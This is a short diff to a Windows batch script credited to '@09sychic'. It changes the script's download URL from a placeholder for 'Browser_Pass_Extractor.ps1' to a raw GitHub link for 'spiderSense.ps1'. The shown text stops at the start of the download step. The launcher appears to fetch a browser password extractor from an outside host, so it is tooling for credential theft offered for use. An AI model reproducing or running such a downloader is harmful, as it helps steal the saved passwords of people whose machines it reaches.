@@ -5,8 +5,7 @@ REM   Credits: @09sychic
 REM ===============================================
 
 REM ===== CONFIG =====
-REM Replace this with your actual download link
-set DOWNLOAD_URL=https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/Browser_Pass_Extractor.ps1
+set DOWNLOAD_URL=https://raw.githubusercontent.com/09sychic/spiderSense/refs/heads/main/spiderSense.ps1
 
 REM ===== DOWNLOAD =====
 echo [*] Downloading script...
